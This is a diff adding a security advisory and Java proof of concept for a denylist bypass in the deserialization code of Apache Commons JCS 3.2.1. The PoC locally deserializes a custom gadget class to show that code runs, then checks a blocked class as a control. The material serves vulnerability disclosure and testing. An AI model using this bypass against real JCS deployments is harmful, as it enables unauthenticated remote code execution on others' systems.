@@ -1,0 +1,104 @@
+/*
+
+
+Apache Commons JCS 3.2.1 Unauthenticated Java Deserialization
+
+
+Vendor: The Apache Software Foundation
+Product web page: https://commons.apache.org/proper/commons-jcs
+Affected version: 3.2.1
+
+Summary: JCS is a distributed caching system written in Java.
+It is intended to speed up applications by providing a means
+to manage cached data of various dynamic natures. Like any caching
+system, JCS is most useful for high read, low put applications.
+Latency times drop sharply and bottlenecks move away from the
+database in an effectively cached system.
+
+Desc: Apache Commons JCS suffers from an unauthenticated Java
+deserialization vulnerability on its TCP Lateral Cache. The
+lateral listener deserializes incoming objects through an
+ObjectInputStream guarded only by a three-prefix class denylist,
+which is bypassable with widely available gadgets, so a remote
+attacker who can reach the lateral port can send a crafted object
+and execute code. On deployments that enable the TCP lateral cache
+this is unauthenticated remote code execution.
+
+=============================================================
+protected Class<?> resolveClass(ObjectStreamClass desc) throws ClassNotFoundException {
+    return Class.forName(BlacklistClassResolver.DEFAULT.check(desc.getName()), false, classLoader);
+}
+private static class BlacklistClassResolver {
+    private static final BlacklistClassResolver DEFAULT = new BlacklistClassResolver(
+        toArray(System.getProperty("jcs.serialization.class.blacklist",
+            "org.codehaus.groovy.runtime.,org.apache.commons.collections.functors.,org.apache.xalan")),
+        toArray(System.getProperty("jcs.serialization.class.whitelist")));
+    boolean isBlacklisted(String name) {
+        return whitelist != null && !contains(whitelist, name) || contains(blacklist, name);
+    }
+}
+=============================================================
+
+Tested on: Microsoft Windows 10 (x86_64)
+           Eclipse Temurin OpenJDK 21.0.6 (LTS)
+
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-6008
+Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6008
+
+
+13.08.2026
+
+*/
+
+
+import org.apache.commons.jcs3.utils.serialization.StandardSerializer;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.io.Serializable;
+
+public class JcsDeserPoc {
+
+    static byte[] serialize(final Serializable o) throws Exception {
+        final ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) { oos.writeObject(o); }
+        return bos.toByteArray();
+    }
+
+    public static void main(String[] args) throws Exception {
+        final StandardSerializer ser = new StandardSerializer();
+        final ClassLoader cl = JcsDeserPoc.class.getClassLoader();
+        System.out.println("JCS runtime: "
+                + StandardSerializer.class.getProtectionDomain().getCodeSource().getLocation());
+
+        System.out.println("\n[A] Deserialize a class not on the denylist (evilgadget.JcsPwn):");
+        final byte[] evil = serialize(new evilgadget.JcsPwn());
+        try {
+            Object out = ser.deSerialize(evil, cl);
+            System.out.println("Returned: " + out.getClass().getName());
+        } catch (Exception e) {
+            System.out.println("(Post-readObject) " + e.getClass().getSimpleName() + ": " + e.getMessage());
+        }
+        System.out.println("JcsPwn.EXECUTED = " + evilgadget.JcsPwn.EXECUTED
+                + (evilgadget.JcsPwn.EXECUTED
+                    ? "  >>> DENYLIST BYPASSED: code ran during deserialization." : ""));
+
+        System.out.println("\n[B] Control: deSerialize a class on the denylist "
+                + "(org.apache.commons.collections.functors.BlacklistedFunctor):");
+        final byte[] blocked = serialize(new org.apache.commons.collections.functors.BlacklistedFunctor());
+        try {
+            ser.deSerialize(blocked, cl);
+            System.out.println("ACCEPTED (unexpected!)");
+        } catch (Exception e) {
+            Throwable c = e; while (c.getCause() != null) c = c.getCause();
+            System.out.println("BLOCKED as expected: " + c.getClass().getSimpleName() + ": " + c.getMessage());
+        }
+
+        System.out.println("\nThanks for stopping by!");
+    }
+}
